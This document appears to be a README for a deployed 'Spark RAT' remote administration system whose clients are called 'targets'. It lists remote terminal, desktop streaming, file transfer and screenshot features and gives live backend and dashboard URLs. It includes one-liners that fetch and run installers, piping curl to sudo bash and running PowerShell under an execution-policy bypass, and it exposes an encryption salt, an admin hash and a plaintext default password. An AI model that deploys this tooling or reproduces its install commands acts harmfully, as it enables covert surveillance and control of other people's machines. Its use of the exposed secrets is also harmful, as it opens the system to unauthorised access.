# Spark RAT Production System

## 🚀 Overview

Spark RAT is a comprehensive Remote Administration Tool (RAT) system that provides secure remote access and management capabilities for multiple devices. This production deployment includes a Go-based backend server, React frontend dashboard, and cross-platform client applications.

## 🏗️ System Architecture

```
┌─────────────────┐    ┌─────────────────┐    ┌─────────────────┐
│   Frontend      │    │   Backend       │    │   Clients       │
│   (Vercel)      │◄──►│   (Render)      │◄──►│   (Targets)     │
│   - React App   │    │   - Go Server   │    │   - Windows     │
│   - Dashboard   │    │   - WebSocket   │    │   - Linux       │
│   - Real-time   │    │   - API         │    │   - macOS       │
└─────────────────┘    └─────────────────┘    └─────────────────┘
```

## 🔗 Production URLs

- **Frontend Dashboard**: https://spark-rat-dashboard.vercel.app
- **Backend API**: https://spark-backend-fixed-v2.onrender.com
- **WebSocket**: wss://spark-backend-fixed-v2.onrender.com/ws

## 🛠️ Features

### Core RAT Capabilities
- **Terminal Access**: Remote command execution and terminal control
- **Desktop Control**: Real-time desktop streaming and control
- **File Management**: Upload, download, and manage files remotely
- **Process Management**: Monitor and control running processes
- **Screenshot Capture**: Take screenshots of target devices
- **System Control**: Lock, restart, shutdown, and system operations

### Advanced Features
- **Real-time Communication**: WebSocket-based real-time updates
- **Multi-platform Support**: Windows, Linux, and macOS clients
- **Secure Communication**: Encrypted client-server communication
- **User Management**: Admin authentication and access control
- **Client Management**: Generate, deploy, and manage clients
- **Responsive Design**: Mobile and desktop optimized interface

## 🚀 Quick Start

### 1. Access the Dashboard
Visit the production dashboard at: https://spark-rat-dashboard.vercel.app

### 2. Generate a Client
1. Click "Generate Client" in the dashboard
2. Select target platform (Windows/Linux/macOS)
3. Choose architecture (AMD64/ARM64)
4. Download the generated client

### 3. Deploy Client
**Windows:**
```powershell
# Download and run installer
Invoke-WebRequest -Uri "https://spark-rat-dashboard.vercel.app/install-windows.ps1" -OutFile "install.ps1"
Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope Process -Force
.\install.ps1
```

**Linux/macOS:**
```bash
# Download and run installer
curl -sSL https://spark-rat-dashboard.vercel.app/install-linux.sh | sudo bash
```

### 4. Monitor Devices
Once clients are deployed, they will appear in the dashboard where you can:
- View device information and status
- Access terminal and desktop control
- Manage files and processes
- Monitor system performance

## 🔧 Configuration

### Backend Configuration (Render)
Environment variables configured in Render dashboard:
- `PORT=8000`
- `GO_ENV=production`
- `SPARK_SALT=a2dac101827c8d47f00831f2d6c078b2`
- `SPARK_ADMIN_HASH=$2b$10$RYCAuSMeNE1uh2/qka5PSeE6RFjynbpXu95HMStXmUHA8qaQNBFjG`

### Frontend Configuration (Vercel)
Environment variables configured in Vercel dashboard:
- `REACT_APP_API_URL=https://spark-backend-fixed-v2.onrender.com`
- `REACT_APP_WS_URL=wss://spark-backend-fixed-v2.onrender.com`
- All feature flags enabled

### Client Configuration
Clients are pre-configured with production settings:
- Backend URL: `spark-backend-fixed-v2.onrender.com`
- Port: 443 (HTTPS)
- Encryption salt: `a2dac101827c8d47f00831f2d6c078b2`

## 🔒 Security

### Authentication
- **Admin Password**: `ChangeMe2024!SecurePassword` (CHANGE IN PRODUCTION!)
- **Encryption**: All communication encrypted with shared salt
- **HTTPS Only**: All communication over secure connections

### Security Headers
- X-Content-Type-Options: nosniff
- X-Frame-Options: DENY
- X-XSS-Protection: 1; mode=block
- Referrer-Policy: strict-origin-when-cross-origin

### Best Practices
1. **Change default passwords immediately**
2. **Rotate encryption salt regularly**
3. **Monitor access logs**
4. **Use strong authentication**
5. **Regular security audits**

## 📊 Monitoring

### Health Checks
- **Backend**: https://spark-backend-fixed-v2.onrender.com/api/info
- **Frontend**: https://spark-rat-dashboard.vercel.app
- **WebSocket**: wss://spark-backend-fixed-v2.onrender.com/ws

### Monitoring Tools
- **Render Dashboard**: Monitor backend health and resources
- **Vercel Dashboard**: Monitor frontend performance and errors
- **Application Logs**: Monitor client connections and activities

### Key Metrics
- Active client connections
- API response times
- Error rates
- Resource usage
- User activity

## 🛠️ Maintenance

### Daily Tasks
- [ ] Check service health
- [ ] Monitor error logs
- [ ] Review client connections
- [ ] Check resource usage

### Weekly Tasks
- [ ] Security audit
- [ ] Performance review
- [ ] Backup verification
- [ ] Update dependencies

### Monthly Tasks
- [ ] Rotate secrets
- [ ] Security assessment
- [ ] Performance optimization
- [ ] Documentation update

## 🚨 Troubleshooting

### Common Issues

#### Backend Issues
- **Service won't start**: Check environment variables in Render
- **API not responding**: Verify backend health endpoint
- **WebSocket connection failed**: Check firewall and network settings

#### Frontend Issues
- **Dashboard won't load**: Check Vercel deployment status
- **Can't connect to backend**: Verify backend URL configuration
- **Features not working**: Check feature flags in environment variables

#### Client Issues
- **Client won't connect**: Verify salt configuration matches backend
- **Installation fails**: Check permissions and network connectivity
- **Client not appearing**: Verify client is running and connected

### Debug Commands
```bash
# Check backend health
curl https://spark-backend-fixed-v2.onrender.com/api/info

# Check frontend
curl https://spark-rat-dashboard.vercel.app

# Test WebSocket
wscat -c wss://spark-backend-fixed-v2.onrender.com/ws
```

## 📚 Documentation

### System Documentation
- **Backend**: `spark-setup/spark-backend/README.md`
- **Frontend**: `spark-setup/spark-frontend/README.md`
- **Client**: `spark-setup/spark-client/INSTALLATION_GUIDE.md`

### Deployment Guides
- **Render Deployment**: `RENDER_DEPLOYMENT_GUIDE.md`
- **Vercel Deployment**: `VERCEL_DEPLOYMENT_GUIDE.md`
- **Production Setup**: `PRODUCTION_ENVIRONMENT_CONFIG.md`

### Security Documentation
- **Security Checklist**: `PRODUCTION_SECURITY_CHECKLIST.md`
- **Monitoring Setup**: `PRODUCTION_MONITORING_CONFIG.md`

## 🧪 Testing

### Test Suites
- **End-to-End Tests**: `./test-end-to-end.sh`
- **Client Integration**: `./test-client-integration.sh`
- **Complete Test Suite**: `./run-all-tests.sh`

### Running Tests
```bash
# Run all tests
./run-all-tests.sh

# Run specific test suite
./test-end-to-end.sh
./test-client-integration.sh
```

## 🔄 Updates and Deployment

### Backend Updates
1. Update code in `spark-setup/spark-backend/`
2. Push changes to Git
3. Render automatically redeploys
4. Verify health endpoint

### Frontend Updates
1. Update code in `spark-setup/spark-frontend/`
2. Push changes to Git
3. Vercel automatically redeploys
4. Verify frontend accessibility

### Client Updates
1. Update client code in `spark-setup/spark-client/`
2. Rebuild client binaries
3. Update installation scripts
4. Deploy new clients

## 📞 Support

### Getting Help
- **Documentation**: Check relevant README files
- **Issues**: GitHub Issues for bug reports
- **Monitoring**: Check Render and Vercel dashboards
- **Logs**: Review application and deployment logs

### Emergency Procedures
1. **Service Down**: Check Render/Vercel dashboards
2. **Security Incident**: Follow security checklist
3. **Data Loss**: Restore from backups
4. **Performance Issues**: Check resource usage and logs

## 📋 System Requirements

### Backend (Render)
- **Plan**: Starter (Free tier)
- **Memory**: 512MB
- **CPU**: Shared
- **Storage**: 1GB
- **Network**: HTTPS only

### Frontend (Vercel)
- **Plan**: Hobby (Free tier)
- **Build**: Static site generation
- **CDN**: Global distribution
- **SSL**: Automatic HTTPS

### Clients
- **Windows**: Windows 7+ (64-bit)
- **Linux**: Ubuntu 18.04+ / CentOS 7+
- **macOS**: macOS 10.14+
- **Architecture**: AMD64 / ARM64

## 🎯 Performance

### Expected Performance
- **Backend Response**: < 2 seconds
- **Frontend Load**: < 5 seconds
- **WebSocket Latency**: < 100ms
- **Client Connection**: < 10 seconds

### Optimization
- **Caching**: Static assets cached for 1 year
- **Compression**: Gzip compression enabled
- **CDN**: Global content delivery
- **Minification**: JavaScript and CSS minified

## 🔐 Compliance

### Data Protection
- **Encryption**: All data encrypted in transit
- **Authentication**: Secure admin authentication
- **Logging**: Comprehensive audit logging
- **Access Control**: Role-based access control

### Legal Considerations
- **Privacy Policy**: Required for production use
- **Terms of Service**: Required for production use
- **Data Retention**: Configurable retention policies
- **User Consent**: Required for client deployment

---

**System Status**: Production Ready ✅
**Last Updated**: $(date)
**Version**: 2.0.0
**Maintainer**: Development Team